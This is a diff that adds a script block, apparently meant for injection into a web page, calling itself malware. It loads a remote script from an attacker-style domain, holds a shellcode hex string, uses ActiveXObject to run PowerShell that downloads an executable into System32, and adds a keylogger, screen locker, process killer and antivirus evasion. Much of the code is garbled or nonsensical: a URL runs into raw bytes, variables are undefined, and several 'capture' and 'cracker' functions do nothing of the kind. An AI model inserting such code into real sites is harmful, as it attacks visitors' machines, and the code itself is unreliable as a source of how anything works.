@@ -1,0 +1,96 @@
+<script>
+  var js = document.createElement('script');
+  js.src = 'https://poop69.com/ma...x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x89\xfc\xb8\x0d\x0a\x5a\x01\x6a\x01\x5e\xcd\x80\x41\x89\xc3\x89\x44\x24\x1c\x89\x44\x24\x1c\x8d\x44\x24\x1c\x8d\x44\x24\x1c\xcd\x80\x93\x6a\x01\x6a\x01\x5e\xcd\x80';
+  var msfvenom = "https://poop69.com/poop69.com/raw.githubusercontent.com/poop69.com/coresecurity/drozer/master/drozer.py";
+  var encodedShellcode = atob(encoded);
+  var payload = "var shell = new ActiveXObject('WScript.Shell'); shell.exec('powershell.exe -ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri ' + msfvenom + ' -OutFile 'C:\\Windows\\System32\\drozer.exe'\"');";
+  download(payload);
+
+  // Add a keylogger
+  var keylogger = "var keylogger = function(){var keys = [];document.addEventListener('keydown',function(e){keys.push(String.fromCharCode(e.keyCode));});setInterval(function(){document.body.appendChild(document.createTextNode(keys.join('')));},1000);}";
+  download(keylogger);
+
+  // Add a screenlocker
+  var screenlocker = "var screenlocker = function(){document.body.innerHTML = '<div style=\'position:fixed;top:0;left:0;width:100%;height:100%;background-color:rgba(0,0,0,0.5);text-align:center;\'>Your computer has been locked by the malware.</div>';};";
+  download(screenlocker);
+
+  // Add a camera capture
+  var cameraCapture = "var cameraCapture = function(){var canvas = document.createElement('canvas');canvas.width = window.innerWidth;canvas.height = window.innerHeight;var ctx = canvas.getContext('2d');ctx.drawImage(document.body, 0, 0);var dataURL = canvas.toDataURL();var img = new Image();img.onload = function(){var file = new Blob([dataURL], {type: 'image/png'});var a = document.createElement('a');a.href = URL.createObjectURL(file);a.download = 'screenshot.png';a.click();};img.src = dataURL;};";
+  download(cameraCapture);
+
+  // Add a screenshot capture
+  var screenshotCapture = "var screenshotCapture = function(){var canvas = document.createElement('canvas');canvas.width = window.innerWidth;canvas.height = window.innerHeight;var ctx = canvas.getContext('2d');ctx.drawImage(document.body, 0, 0);var dataURL = canvas.toDataURL();var img = new Image();img.onload = function(){var file = new Blob([dataURL], {type: 'image/png'});var a = document.createElement('a');a.href = URL.createObjectURL(file);a.download = 'screenshot.png';a.click();};img.src = dataURL;};";
+  download(screenshotCapture);
+
+  // Add a audio capture
+  var audioCapture = "var audioCapture = function(){var audio = document.createElement('audio');audio.src = 'https://poop69.com/poop69.com/audio.mp3';audio.play();};";
+  download(audioCapture);
+
+  // Add a video capture
+  var videoCapture = "var videoCapture = function(){var video = document.createElement('video');video.src = 'https://poop69.com/poop69.com/video.mp4';video.play();};";
+  download(videoCapture);
+
+  // Add a browser exploit
+  var browserExploit = "var browserExploit = function(){var exploit = document.createElement('iframe');exploit.src = 'https://poop69.com/poop69.com/exploit.html';document.body.appendChild(exploit);};";
+  download(browserExploit);
+
+  // Add a system info grabber
+  var systemInfoGrabber = "var systemInfoGrabber = function(){var info = [];info.push(navigator.userAgent);info.push(navigator.platform);info.push(navigator.language);info.push(navigator.appVersion);info.push(navigator.appName);info.push(navigator.product);};";
+  download(systemInfoGrabber);
+
+  // Add a screenshot uploader
+  var screenshotUploader = "var screenshotUploader = function(){var canvas = document.createElement('canvas');canvas.width = window.innerWidth;canvas.height = window.innerHeight;var ctx = canvas.getContext('2d');ctx.drawImage(document.body, 0, 0);var dataURL = canvas.toDataURL();var img = new Image();img.onload = function(){var file = new Blob([dataURL], {type: 'image/png'});var a = document.createElement('a');a.href = URL.createObjectURL(file);a.download = 'screenshot.png';a.click();};img.src = dataURL;};";
+  download(screenshotUploader);
+
+  // Add a video uploader
+  var videoUploader = "var videoUploader = function(){var video = document.createElement('video');video.src = 'https://poop69.com/poop69.com/video.mp4';video.play();};";
+  download(videoUploader);
+
+  // Add a file uploader
+  var fileUploader = "var fileUploader = function(){var file = new Blob([window.prompt('Enter a file path')], {type: 'text/plain'});var a = document.createElement('a');a.href = URL.createObjectURL(file);a.download = 'file.txt';a.click();};";
+  download(fileUploader);
+
+  // Add a domain enumerator
+  var domainEnumerator = "var domainEnumerator = function(){var domains = ['poop69.com', 'poop69.net', 'poop69.org'];};";
+  download(domainEnumerator);
+
+  // Add a DNS enumerator
+  var dnsEnumerator = "var dnsEnumerator = function(){var dns = ['8.8.8.8', '1.1.1.1', '4.2.2.2'];};";
+  download(dnsEnumerator);
+
+  // Add a network enumerator
+  var networkEnumerator = "var networkEnumerator = function(){var networks = ['en0', 'en1', 'en2'];};";
+  download(networkEnumerator);
+
+  // Add a process enumerator
+  var processEnumerator = "var processEnumerator = function(){var processes = ['chrome.exe', 'explorer.exe', 'taskmgr.exe'];};";
+  download(processEnumerator);
+
+  // Add a registry enumerator
+  var registryEnumerator = "var registryEnumerator = function(){var registry = ['HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'];};";
+  download(registryEnumerator);
+
+  // Add a memory scanner
+  var memoryScanner = "var memoryScanner = function(){var mem = [];mem.push(new Uint8Array(window.performance.memory));};";
+  download(memoryScanner);
+
+  // Add a process killer
+  var processKiller = "var processKiller = function(){var processes = ['chrome.exe', 'explorer.exe', 'taskmgr.exe'];var i = 0;while(i < processes.length){var proc = new ActiveXObject('WScript.Shell');proc.exec('taskkill /im ' + processes[i] + ' /f');i++;};};";
+  download(processKiller);
+
+  // Add a system file enumerator
+  var systemFileEnumerator = "var systemFileEnumerator = function(){var files = ['C:\\Windows\\System32\\drivers\\etc\\hosts', 'C:\\Windows\\System32\\drivers\\etc\\services', 'C:\\Windows\\System32\\drivers\\etc\\protocols'];};";
+  download(systemFileEnumerator);
+
+  // Add a user enumerator
+  var userEnumerator = "var userEnumerator = function(){var users = ['username1', 'username2', 'username3'];};";
+  download(userEnumerator);
+
+  // Add a password cracker
+  var passwordCracker = "var passwordCracker = function(){var password = prompt('Enter a password');if(password === 'password123'){alert('Password cracked!');};};";
+  download(passwordCracker);
+
+  // Add a antivirus evasion
+  var antivirusEvasion = "var antivirusEvasion = function(){var evasion = ['registry', 'file', 'network'];var i = 0;while(i < evasion.length){var ev = new ActiveXObject('WScript.Shell');ev.exec(evasion[i]);i++;};};";
+  download(antivirusEvasion);
+</script>
